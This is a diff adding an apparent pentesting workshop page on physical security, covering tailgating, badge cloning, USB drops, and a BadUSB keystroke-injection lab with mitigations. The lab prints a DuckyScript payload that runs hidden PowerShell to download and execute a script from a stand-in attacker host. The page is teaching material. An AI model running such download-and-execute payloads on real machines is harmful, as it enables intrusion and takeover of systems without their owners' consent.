@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VAPT Workshop - Physical Security</title>
+    <link rel="stylesheet" href="../../styles/theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Fira+Code&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="app-container">
+    
+
+    <nav class="sidebar">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2.5rem;">
+            <span class="brand" style="margin-bottom: 0;">VAPT Workshop</span>
+            <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle Light/Dark Mode" style="position: static; padding: 0.5rem; border-radius: 50%; width: 40px; height: 40px; display: flex; justify-content: center; align-items: center;">
+                <span id="themeIcon" style="font-size: 1.2rem;">☀️</span>
+            </button>
+        </div>
+        <div class="nav-group">
+            <div class="nav-group-title">Table of Contents</div>
+            <ul class="nav-links">
+                <li><a href="../../index.html">Welcome & Intro</a></li>
+                <li><a href="../../modules/privilege-escalation/overview.html">Privilege Escalation</a></li>
+                <li><a href="../../modules/xss/overview.html">Cross-Site Scripting (XSS)</a></li>
+                <li><a href="../../modules/privesc-xss/overview.html">PrivEsc via XSS</a></li>
+                <li><a href="../../modules/metasploit/overview.html">Metasploit</a></li>
+                <li><a href="../../modules/exploitation/overview.html">Exploitation Frameworks</a></li>
+                <li><a href="../../modules/sqli/overview.html">SQL Injection</a></li>
+                <li><a href="../../modules/aitm/overview.html">AITM Attacks</a></li>
+                <li><a href="../../modules/password-attacks/overview.html">Password Attacks</a></li>
+                <li><a href="../../modules/network-pentesting/overview.html">Network Pentesting</a></li>
+                <li><a href="../../modules/wireless-pentesting/overview.html">Wireless Pentesting</a></li>
+                <li><a href="../../modules/social-engineering/overview.html">Social Engineering</a></li>
+                <li><a href="../../modules/security-controls/overview.html">Security Controls</a></li>
+                <li><a href="../../modules/physical-security/overview.html" class="active">Physical Security</a></li>
+                <li><a href="../../modules/reporting/overview.html">Reporting</a></li>
+            </ul>
+        </div>
+    </nav>
+    <main class="main-content" id="content-anchor">
+        # Module: Physical Security
+
+<div class="glass-card">
+  <h2>1. Core Concept 🧠</h2>
+  <p><strong>Physical Security</strong> is the protection of personnel, hardware, software, networks, and data from physical actions and events that could cause serious loss or damage to an enterprise. It is often the most overlooked aspect of cybersecurity.</p>
+  <p><em>Real-world analogy:</em> It doesn't matter if your servers are protected by 2048-bit RSA encryption and three firewalls if an attacker can literally walk into the server room and carry the server out the back door.</p>
+</div>
+
+<div class="glass-card">
+  <h2>2. Physical Attack Vectors 🎯</h2>
+  <div class="attack-flow">
+    <div class="flow-step">🏢 Recon (Observe shift changes, cameras)</div>
+    <div class="flow-arrow">↓</div>
+    
+    <div class="flow-step">🚪 Tailgating (Following someone inside)</div>
+    <div class="flow-arrow">↓</div>
+    
+    <div class="flow-step">🔌 Rogue Device Placement (Dropbox/Raspberry Pi)</div>
+    <div class="flow-arrow">↓</div>
+    
+    <div class="flow-step">📡 Remote Access Established bypassing Firewalls</div>
+  </div>
+  
+  <h4>Execution Mapping</h4>
+  <table>
+    <thead>
+      <tr>
+        <th>Attack Type</th>
+        <th>Tools / Methodology</th>
+        <th>Result</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Badge Cloning</td>
+        <td>Proxmark3 / RFID Cloner</td>
+        <td>Attacker clones employee's access card in elevators</td>
+      </tr>
+      <tr>
+        <td>USB Drop</td>
+        <td>Rubber Ducky / Malicious USBs in parking lot</td>
+        <td>Curious employee plugs it in; malware installs instantly</td>
+      </tr>
+      <tr>
+        <td>Lock Picking</td>
+        <td>Tension wrench, picks, under-door tools</td>
+        <td>Access to restricted IDF closets / Server Rooms</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="glass-card">
+  <h2>3. Hands-on Lab 🧪</h2>
+  
+  <div class="lab-header">
+    <h3 class="lab-title">🧪 Lab: BadUSB Keystroke Injection</h3>
+    <div class="lab-meta">
+      <span class="meta-badge">Topic: Hardware</span>
+      <span class="meta-badge difficulty-easy">Difficulty: Easy</span>
+      <span class="meta-badge">Time: 20 mins</span>
+    </div>
+<div style="margin-top: 15px;"><a href="http://localhost:80" target="_blank" class="btn-start-lab">🚀 Start Lab Environment</a></div>
+  </div>
+  
+  <div class="lab-content">
+    
+    <div class="callout deep">
+      <div class="icon">🔍</div>
+      <div class="content"><strong>What is a BadUSB?</strong> Devices like the Hak5 Rubber Ducky look like standard USB flash drives, but the computer recognizes them as keyboards. Since computers implicitly trust keyboards, the device can rapidly "type" malicious commands faster than a human ever could as soon as it is plugged in.</div>
+    </div>
+    
+    <h4>Architecture Diagram</h4>
+    <img src="../../assets/badusb.png" alt="Workshop Diagram" style="width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem;">
+    
+    <h4>Setup</h4>
+    <pre><code># Since we lack physical Rubber Ducky hardware, we compile a Digispark/Ducky payload conceptually.
+# The payload uses 'DuckyScript'.</code></pre>
+    
+    <h4>Payload Script (DuckyScript)</h4>
+    <ol>
+      <li>The script forcefully opens a Windows Command Prompt and downloads a payload:</li>
+    </ol>
+    <pre><code>DELAY 1000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://attacker.com/payload.ps1')"
+ENTER</code></pre>
+    
+    <h4>Expected Output</h4>
+    <img src="../../assets/hacker_terminal.png" alt="Workshop Diagram" style="width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem;">
+    
+    <h4>Fix / Mitigation</h4>
+    <p>Block unauthorized USB devices using Endpoint Protection (Device Control policies). Use physically secure server racks, implement mantraps, enforce "No Tailgating" rules with security guards, and train staff to never plug in random found devices.</p>
+  </div>
+</div>
+
+    
+    <div class="content-nav">
+        <div><a href="../../modules/security-controls/overview.html" class="content-nav-prev"><span>←</span> Security Controls</a></div>
+        <div><a href="../../modules/reporting/overview.html" class="content-nav-next"><span>→</span> Reporting</a></div>
+    </div>
+    
+</main>
+</div>
+
+<script>
+    // Theme toggling logic
+    function setTheme(isLight) {
+        if (isLight) {
+            document.documentElement.classList.add('light-theme');
+            document.getElementById('themeIcon').innerText = '🌙';
+            
+            localStorage.setItem('vapt-theme', 'light');
+        } else {
+            document.documentElement.classList.remove('light-theme');
+            document.getElementById('themeIcon').innerText = '☀️';
+            
+            localStorage.setItem('vapt-theme', 'dark');
+        }
+    }
+
+    function toggleTheme() {
+        const isLight = !document.documentElement.classList.contains('light-theme');
+        setTheme(isLight);
+    }
+
+    // Initialize theme based on localStorage
+    const savedTheme = localStorage.getItem('vapt-theme');
+    if (savedTheme === 'light') {
+        setTheme(true);
+    }
+</script>
+
+</body>
+</html>
